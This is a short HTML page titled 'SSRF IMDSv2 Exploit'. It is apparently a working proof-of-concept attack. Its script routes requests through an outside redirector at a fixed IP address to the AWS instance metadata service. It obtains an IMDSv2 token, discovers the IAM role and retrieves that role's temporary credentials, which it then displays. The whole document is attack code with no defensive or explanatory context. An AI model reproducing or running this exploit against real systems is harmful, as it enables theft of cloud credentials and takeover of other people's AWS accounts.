<!DOCTYPE html>
<html>
  <head>
    <title>SSRF IMDSv2 Exploit</title>
  </head>
  <body>
    <h1>Fetching IMDSv2 credentials...</h1>

    <script>
      const redirectorBase = 'https://13.221.230.104/redir.php?url=';

      function fetchViaRedirector(url, options = {}) {
        const targetUrl = redirectorBase + encodeURIComponent(url);
        return fetch(targetUrl, options);
      }

      async function getIMDSv2Credentials() {
        try {
          const tokenRes = await fetchViaRedirector('http://169.254.169.254/latest/api/token', {
            method: 'PUT',
            headers: {
              'X-aws-ec2-metadata-token-ttl-seconds': '21600',
            },
          });

          const token = await tokenRes.text();

          const roleRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
            headers: {
              'X-aws-ec2-metadata-token': token,
            },
          });

          const role = await roleRes.text();

          const credsRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, {
            headers: {
              'X-aws-ec2-metadata-token': token,
            },
          });

          const creds = await credsRes.text();
          console.log('Credentials:', creds);

          document.body.innerHTML += `<pre>${creds}</pre>`;
        } catch (err) {
          console.error('Error:', err);
          document.body.innerHTML += `<p style="color:red">Failed: ${err}</p>`;
        }
      }

      getIMDSv2Credentials();
    </script>
  </body>
</html>
